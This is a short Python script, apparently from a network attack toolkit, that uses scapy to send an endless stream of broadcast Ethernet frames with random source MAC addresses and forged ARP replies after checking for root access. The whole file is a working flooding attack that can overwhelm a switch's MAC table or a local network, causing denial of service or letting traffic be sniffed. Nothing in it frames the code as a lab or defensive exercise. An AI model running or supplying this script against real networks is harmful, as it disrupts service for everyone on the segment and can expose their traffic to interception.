#!/usr/bin/env python


from scapy.all import *

import utils


def run():
    while True:
        sendp(Ether(src=RandMAC(),
                    dst="FF:FF:FF:FF:FF:FF") /
              ARP(op=2,
                  psrc="0.0.0.0",
                  hwdst="FF:FF:FF:FF:FF:FF") /
              Padding(load="X" * 18))


if __name__ == '__main__':
    utils.assure_root()
    utils.config_graceful_exit()
    run()
